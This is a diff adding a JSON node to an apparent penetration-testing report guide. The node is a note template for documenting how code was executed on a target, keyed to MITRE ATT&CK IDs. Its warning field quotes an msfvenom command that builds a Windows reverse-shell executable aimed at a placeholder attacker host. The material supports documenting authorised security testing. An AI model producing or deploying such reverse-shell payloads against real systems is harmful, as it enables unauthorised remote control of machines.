@@ -1,0 +1,18 @@
+{
+  "id": "doc_execution",
+  "phase": "REPORT",
+  "title": "TA0002 — Execution",
+  "body": "Document how you ran code on the target. Often overlaps with Initial Access but worth its own note — especially for multi-stage payloads, web shells, or script interpreters.",
+  "cmd": "# TA0002 Execution — note template\n# Technique IDs to reference:\n#   T1059.001 — PowerShell\n#   T1059.003 — Windows Command Shell (cmd.exe)\n#   T1059.004 — Unix Shell\n#   T1059.007 — JavaScript (XSS/Node)\n#   T1203 — Exploitation for Client Execution\n#   T1106 — Native API\n\n## Execution — $ip\n\nInterpreter/Method: [PowerShell / bash / cmd / web shell / etc.]\nTechnique: T1059.00x\n\n## Commands Run on Target\n# Document exactly what you ran — copy from terminal history\nhistory | tail -50\n\n## Payload Details\nType: [Meterpreter / netcat / python / aspx shell / etc.]\nStaged/Stageless: [staged uses stager + stage, stageless is single binary]\nDelivery method: [uploaded via / triggered via / embedded in]\n\n## Evidence\n- Screenshot: payload execution\n- Screenshot: callback received on attacker machine\n- File: ~/results/$ip/exploits/ (save payload file)",
+  "warn": "If you used msfvenom, save the exact generation command. 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=443 -f exe > shell.exe' belongs in your notes verbatim.",
+  "choices": [
+    {
+      "label": "TA0004 — Privilege Escalation",
+      "next": "doc_privesc"
+    },
+    {
+      "label": "Back to tactic index",
+      "next": "reporting"
+    }
+  ]
+}
